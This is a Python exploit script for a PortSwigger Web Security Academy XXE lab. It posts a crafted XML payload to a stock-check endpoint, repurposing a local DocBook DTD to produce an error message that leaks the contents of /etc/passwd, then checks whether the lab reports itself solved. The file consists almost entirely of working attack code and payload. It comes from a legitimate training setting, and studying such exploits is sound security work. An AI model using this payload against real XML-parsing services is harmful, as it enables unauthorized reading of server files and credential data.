#!/usr/bin/env python3
# Lab: Exploiting XXE to retrieve data by repurposing a local DTD
# Lab-Link: https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def main():
    print('[+] Lab: Exploiting XXE to retrieve data by repurposing a local DTD')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    url = f'{host}/product/stock'
    data = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM
&#x27;file:///foobar/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>"""

    if 'root:x:0:0:root:/root:/bin/bash' not in client.post(url, data=data).text:
        print(f'[-] Response does not appear to contain contents of /etc/passwd')
        sys.exit(-2)
    print(f'[+] Response appears to contain contents of /etc/passwd')

    if 'Congratulations, you solved the lab!' not in client.get(host).text:
        print(f'[-] Failed to solve lab')
        sys.exit(-4)

    print(f'[+] Lab solved')


if __name__ == "__main__":
    main()